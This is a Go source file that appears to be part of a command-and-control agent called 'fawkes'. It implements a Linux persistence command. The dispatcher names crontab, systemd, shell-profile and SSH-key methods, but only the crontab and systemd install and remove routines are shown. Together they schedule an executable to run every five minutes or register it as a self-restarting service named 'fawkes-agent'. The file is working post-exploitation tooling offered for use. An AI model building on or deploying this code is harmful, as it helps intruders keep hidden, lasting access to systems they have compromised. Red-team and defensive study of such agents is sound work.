//go:build linux
// +build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method  string `json:"method"`
	Action  string `json:"action"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	Hive    string `json:"hive"`
	CLSID   string `json:"clsid"`
	Timeout string `json:"timeout"`
	// Linux-specific
	Schedule string `json:"schedule"` // crontab schedule expression (e.g., "*/5 * * * *")
	User     string `json:"user"`     // target user for crontab (default: current)
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	var args persistArgs

	if task.Params == "" {
		return errorResult("Error: parameters required (method, action, name, path)")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "crontab", "cron":
		return persistCrontab(args)
	case "systemd", "systemd-service":
		return persistSystemd(args)
	case "shell-profile", "shell", "bashrc":
		return persistShellProfile(args)
	case "ssh-key", "authorized-keys":
		return persistSSHKey(args)
	case "list":
		return persistLinuxList()
	default:
		return errorf("Unknown method: %s. Use: crontab, systemd, shell-profile, ssh-key, or list", args.Method)
	}
}

// persistCrontab installs or removes a crontab entry
func persistCrontab(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistCrontabInstall(args)
	case "remove":
		return persistCrontabRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistCrontabInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Schedule == "" {
		args.Schedule = "*/5 * * * *" // Default: every 5 minutes
	}

	// Build the crontab line with a marker comment for easy removal
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}
	cronLine := fmt.Sprintf("%s %s # %s", args.Schedule, args.Path, marker)

	// Get current crontab
	var currentCrontab string
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		// No existing crontab is OK
		currentCrontab = ""
	} else {
		currentCrontab = string(output)
	}

	// Check if entry already exists
	if strings.Contains(currentCrontab, marker) {
		return errorf("Crontab entry with marker '%s' already exists. Remove first or use a different name.", marker)
	}

	// Append the new entry
	newCrontab := currentCrontab
	if !strings.HasSuffix(newCrontab, "\n") && newCrontab != "" {
		newCrontab += "\n"
	}
	newCrontab += cronLine + "\n"

	// Install via pipe to crontab
	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCrontab)
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to install crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Crontab persistence installed:\n  Schedule: %s\n  Command: %s\n  Marker: %s\n\nRemove with: persist -method crontab -action remove -name %s", args.Schedule, args.Path, marker, marker))
}

func persistCrontabRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	// Get current crontab
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorResult("No crontab entries found")
	}

	// Filter out lines matching the marker
	lines := strings.Split(string(output), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, "# "+marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No crontab entries found with marker '%s'", marker)
	}

	newCrontab := strings.Join(filtered, "\n")
	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCrontab)
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to update crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Removed %d crontab entry/entries with marker '%s'", removed, marker))
}

// persistSystemd installs or removes a systemd user service
func persistSystemd(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistSystemdInstall(args)
	case "remove":
		return persistSystemdRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistSystemdInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Name == "" {
		args.Name = "fawkes-agent"
	}

	// Determine user vs system service
	isRoot := os.Getuid() == 0
	var serviceDir string
	if isRoot {
		serviceDir = "/etc/systemd/system"
	} else {
		home, _ := os.UserHomeDir()
		serviceDir = filepath.Join(home, ".config", "systemd", "user")
		os.MkdirAll(serviceDir, 0755)
	}

	serviceName := args.Name + ".service"
	servicePath := filepath.Join(serviceDir, serviceName)

	// Generate service unit
	unit := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=on-failure
RestartSec=30

[Install]
WantedBy=%s
`, args.Name, args.Path, func() string {
		if isRoot {
			return "multi-user.target"
		}
		return "default.target"
	}())

	if err := os.WriteFile(servicePath, []byte(unit), 0644); err != nil {
		return errorf("Failed to write service file: %v", err)
	}

	// Enable and start the service
	var enableCmd *exec.Cmd
	if isRoot {
		enableCmd = exec.Command("systemctl", "daemon-reload")
	} else {
		enableCmd = exec.Command("systemctl", "--user", "daemon-reload")
	}
	_, _ = enableCmd.CombinedOutput()

	var enableArgs []string
	if isRoot {
		enableArgs = []string{"systemctl", "enable", "--now", serviceName}
	} else {
		enableArgs = []string{"systemctl", "--user", "enable", "--now", serviceName}
	}
	startCmd := exec.Command(enableArgs[0], enableArgs[1:]...)
	if out, err := startCmd.CombinedOutput(); err != nil {
		return errorf("Service created at %s but failed to enable: %v\n%s", servicePath, err, string(out))
	}

	scope := "system"
	if !isRoot {
		scope = "user"
	}
	return successResult(fmt.Sprintf("Systemd persistence installed:\n  Service: %s (%s scope)\n  Path: %s\n  Executable: %s\n  Status: enabled + started\n\nRemove with: persist -method systemd -action remove -name %s", serviceName, scope, servicePath, args.Path, args.Name))
}

func persistSystemdRemove(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "fawkes-agent"
	}

	serviceName := args.Name + ".service"
	isRoot := os.Getuid() == 0

	// Stop and disable
	var stopArgs []string
	if isRoot {
		stopArgs = []string{"systemctl", "disable", "--now", serviceName}
	} else {
		stopArgs = []string{"systemctl", "--user", "disable", "--now", serviceName}
	}
	stopCmd := exec.Command(stopArgs[0], stopArgs[1:]...)
	_, _ = stopCmd.CombinedOutput()

	// Remove the service file
	var serviceDir string
	if isRoot {
		serviceDir = "/etc/systemd/system"
	} else {
		home, _ := os.UserHomeDir()
		serviceDir = filepath.Join(home, ".config", "systemd", "user")
	}

	servicePath := filepath.Join(serviceDir, serviceName)
	if err := os.Remove(servicePath); err != nil {
		return errorf("Failed to remove %s: %v", servicePath, err)
	}

	// Daemon reload
	var reloadCmd *exec.Cmd
	if isRoot {
		reloadCmd = exec.Command("systemctl", "daemon-reload")
	} else {
		reloadCmd = exec.Command("systemctl", "--user", "daemon-reload")
	}
	_, _ = reloadCmd.CombinedOutput()

	return successResult(fmt.Sprintf("Removed systemd persistence: %s (%s)", serviceName, servicePath))
}

